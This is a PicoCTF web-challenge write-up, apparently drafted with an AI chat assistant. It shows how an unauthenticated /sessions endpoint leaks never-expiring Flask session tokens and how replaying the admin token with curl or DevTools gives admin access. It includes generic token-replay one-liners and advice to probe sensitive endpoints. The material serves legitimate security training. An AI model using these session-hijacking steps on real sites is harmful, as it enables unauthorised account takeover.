@@ -1,0 +1,180 @@
+t
+Platform: PicoCTF Category: Web Difficulty: Easy Date Solved: 2026-03-29 Author: Heisenberg
+📋 Challenge Description
+
+Proper session timeout controls are critical for securing user accounts. If a user logs in on a public or shared computer but doesn't explicitly log out (instead simply closing the browser tab), and session expiration dates are misconfigured, the session may remain active indefinitely. This then allows an attacker using the same browser later to access the user's account without needing credentials, exploiting the fact that sessions never expire and remain authenticated.
+
+Your friend tells you to check out a new social media platform he built a few years ago. Although its still under development, he said the site is almost complete. He also mentioned that he hates constantly logging into sites, and so has made his page that 'once you login, you never have to log-out again'! Browse here, and find the flag!
+
+Challenge URL: http://dolphin-cove.picoctf.net:65171/ Files Provided: None
+🔍 Initial Reconnaissance
+First Observations
+
+    Landing page is a login form — registered a test account (qwerty) and logged in
+    Homepage displayed a comments section with posts from multiple users
+    One comment by mary_jones_8992 (2024-02-20) mentioned: "Hey I found a strange page at /sessions"
+    This was a deliberate hint pointing to an exposed internal endpoint
+
+Tools Used
+
+    Browser DevTools
+    curl
+
+Information Gathered
+
+GET /sessions
+
+Response:
+1) session:1Aq_jEWfDI-bhPb-W_soPUQsIOJb2TUW4UcXvPhYC4o, {'_permanent': True, 'key': 'admin'}
+2) session:xSrIWEJUozKBL2a-2g1CFGAJ8vnECg0Jio70DwSwzzs, {'_permanent': True, 'key': 'qwerty'}
+
+The /sessions endpoint was publicly accessible with no authentication, and it dumped all active session tokens including the admin's. The _permanent: True flag confirmed sessions never expire.
+🎯 Vulnerability Identification
+
+Suspected Vulnerability: Broken Session Management + Sensitive Data Exposure via Unauthenticated Endpoint
+Why I Suspected This
+
+    Challenge description explicitly hints that sessions never expire
+    The comment hinting at /sessions was suspicious — internal session stores should never be publicly exposed
+    _permanent: True in Flask means the session cookie has no expiration date
+
+Research Done
+
+    OWASP A07:2021 — Identification and Authentication Failures
+    Flask session documentation (SESSION_PERMANENT, PERMANENT_SESSION_LIFETIME)
+
+🚀 Exploitation Process
+Attempt 1: Browse to /sessions endpoint
+
+Payload:
+
+http://dolphin-cove.picoctf.net:65171/sessions
+
+Result: ✅ Success
+
+Why it succeeded: The endpoint had no access control whatsoever — it returned all active sessions in plaintext, including the admin token.
+Attempt 2: Replace session cookie via DevTools
+
+Payload:
+
+Cookie: session=1Aq_jEWfDI-bhPb-W_soPUQsIOJb2TUW4UcXvPhYC4o
+
+Result: ✅ Success
+
+Why it succeeded: The server performs no additional verification (IP binding, user-agent check, etc.) — it blindly trusts whoever presents a valid token. Since the admin session never expired, it was still fully authenticated.
+💡 Solution
+Final Exploit
+
+Step 1: Navigate to the exposed sessions endpoint
+bash
+
+curl -s http://dolphin-cove.picoctf.net:65171/sessions
+```
+
+**Step 2:** Copy the admin session token from the response
+```
+1Aq_jEWfDI-bhPb-W_soPUQsIOJb2TUW4UcXvPhYC4o
+
+Step 3: Send a request to the homepage impersonating admin
+bash
+
+curl -s http://dolphin-cove.picoctf.net:65171/ \
+  -H "Cookie: session=1Aq_jEWfDI-bhPb-W_soPUQsIOJb2TUW4UcXvPhYC4o"
+```
+
+**Or via DevTools:**
+`F12` → Application → Cookies → double-click session value → paste admin token → refresh
+
+### Flag
+```
+picoCTF{[your_flag_here]}
+```
+
+---
+
+## 📖 Key Learnings
+
+### Technical Concepts
+- **Session Hijacking** — stealing a valid session token to impersonate another user without needing their credentials
+- **Flask `_permanent: True`** — makes sessions persist indefinitely; without setting `PERMANENT_SESSION_LIFETIME`, the session literally never dies
+- **Sensitive Data Exposure** — exposing internal application state (like a session store) via an unauthenticated endpoint is a critical misconfiguration
+
+### New Techniques Learned
+1. Using `curl -H` to manually inject cookies into HTTP requests, bypassing the browser entirely
+2. Identifying session management flaws from application behavior hints (comments, challenge description)
+3. Using DevTools → Application → Cookies to swap session tokens mid-session
+
+### Mistakes & What I Learned
+- **Mistake:** Initially didn't notice the `/sessions` hint in the comments and was thinking of more complex attacks
+  - **Lesson:** Always read all content on the page carefully during recon — developers sometimes leave unintentional breadcrumbs
+
+---
+
+## 🔄 Alternative Solutions
+
+### Method 2: DevTools Cookie Swap (No Terminal)
+Instead of curl, you can do the entire attack purely in the browser:
+```
+F12 → Application → Cookies → Edit session value → Refresh
+
+No tools required beyond a browser — makes this attack accessible to anyone with DevTools knowledge.
+💻 Commands & Scripts Used
+Useful One-Liners
+bash
+
+# Fetch page with a specific session cookie
+curl -s http://TARGET/ -H "Cookie: session=TOKEN_HERE"
+
+# View all cookies and headers in response
+curl -sv http://TARGET/ -H "Cookie: session=TOKEN_HERE" 2>&1 | grep -E "Set-Cookie|session"
+
+# Check what /sessions exposes
+curl -s http://TARGET/sessions
+
+🎓 Recommendations for Similar Challenges
+
+If you encounter similar challenges:
+
+    Read all comments and user-generated content — hints are often hidden there
+    Always probe common sensitive endpoints: /sessions, /admin, /debug, /config, /env
+    Check cookie attributes in DevTools — look for missing Expires, HttpOnly, Secure flags
+    If sessions seem permanent, try replaying old/leaked tokens
+
+Red flags to watch for:
+
+    Challenge description mentioning "never log out" or "sessions don't expire"
+    User comments referencing unusual URLs or pages
+    _permanent: True in Flask session data
+    No Expires or Max-Age attribute on session cookies
+
+📸 Screenshots
+
+    Homepage showing comments with mary_jones_8992 hint
+    /sessions endpoint output showing admin token
+    Homepage after cookie swap showing "Welcome Admin"
+
+🔗 References & Resources
+Documentation
+
+    Flask Sessions Documentation
+    OWASP A07 - Identification and Authentication Failures
+
+Articles & Writeups
+
+    OWASP Session Management Cheat Sheet
+
+Tools Used
+
+    curl — HTTP request tool
+    Browser DevTools — Cookie manipulation
+
+🏷️ Tags
+
+#web #session-hijacking #cookies #flask #easy #picoctf #authentication
+
+← Back to Main Index
+
+Just fill in the actual flag value and add your screenshots. Clean writeup — push it to Shaker-maker and it'll look sharp. 🔥
+
+
+Claude is AI and can make mistakes. Please double-check responses.
